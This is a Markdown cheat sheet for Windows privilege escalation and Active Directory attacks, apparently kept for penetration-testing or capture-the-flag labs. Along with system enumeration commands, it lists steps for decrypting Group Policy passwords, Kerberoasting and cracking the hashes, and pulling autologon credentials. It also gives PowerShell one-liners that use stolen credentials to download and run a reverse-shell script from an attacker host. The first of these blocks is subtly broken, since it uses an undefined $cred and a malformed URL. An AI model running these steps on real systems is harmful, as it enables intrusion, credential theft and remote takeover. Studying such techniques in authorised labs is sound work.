# WINDOWS

  

## For the detection of missing patches;

https://github.com/AonCyberLabs/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py

  
  

## Operating System

```cmd
systeminfo

wmic qfe
```
## Users
```  
whoami

echo %USERNAME%

net users

net user <username>

whoami /priv

net localgroup
```
## Network
```
ipconfig /all

route print

arp -A

netstat -ano

 ```

## Programs
```
dir /a "C:\Program Files"

dir /a "C:\Program Files (x86)"

reg query HKEY_LOCAL_MACHINE\SOFTWARE
```
  
  

## Unquoted Service Patch
```
wmic service get name,displayname,pathname,startmode 2>nul |findstr /i "Auto" 2>nul |findstr /i /v "C:\Windows\\" 2>nul |findstr /i /v """
```
  
  

## Scheduled task;
```
schtasks /query /fo LIST 2>nul | findstr TaskName

dir C:\windows\tasks
```
  
  

## For more of the manual enumeration steps;
https://book.hacktricks.xyz/windows/windows-local-privilege-escalation 

https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/

  
  

#For application examples;

https://www.youtube.com/watch?v=Fms9UuW05DA&list=PLi0kul0fEhZ9LNZN0-A3nX2xcx2R70JwN

  
  

## Groups.xml
```
get Groups.xml

cat Groups.xml (name, password)

gpp-Decrypt password #decryp_password

smbclient -W <domain_name> -U name //<domain_name>/share_name
```
## SPN
```
git clone https://github.com/SecureAuthCorp/impacket.git

python GetUsersSPN.py <domain_name>/user:decrypt_password -dc-ip <victim_ip> -request

hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force
```
-------------------------------------------------------------------------------------------------------------------------------

  
  

## Autologon

  

Credentials stored in the registry for autologon.

 We run `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul` to retrive the password

  
  

```cmd

PS C:\inetpub\wwwroot\internal-01\log> $username = "BART\Administrator"

PS C:\inetpub\wwwroot\internal-01\log> $password = "3130438f31186fbaf962f407711faddb"

PS C:\inetpub\wwwroot\internal-01\log> $secstr = New-Object -TypeName System.Security.SecureString

PS C:\inetpub\wwwroot\internal-01\log> $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}

PS C:\inetpub\wwwroot\internal-01\log> Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3:/rev2.ps1') } -Credential $cred -Computer localhost

```

  
These credentials are set by the administrator. Since users have a tendency to reuse passwords, let’s see if the administrator account is set to the same password.
To do that, first run the following command to convert the plain text string “Welcome1!” into a secure string and store the result in the $password variable.

  
```
$password = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
```
  

ConvertTo-SecureString: Converts plain text to secure strings.

-AsPlainText: Specifies a plain text string to convert to a secure string.

-Force: Confirms that you understand the implications of using the AsPlainText parameter and still want to use it.


Second, create a new object to store these credentials. 
```
$cred = New-Object System.Management.Automation.PSCredential('Administrator', $password)
```
  

Third, we’ll use these credentials to start PowerShell and send a (hopefully privileged) reverse shell back to our attack machine.
 weill call another shell using thecred from the box

  

```
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://<ip>:8000/revin.ps1')" -Credential $cred
```
  
  
  
  
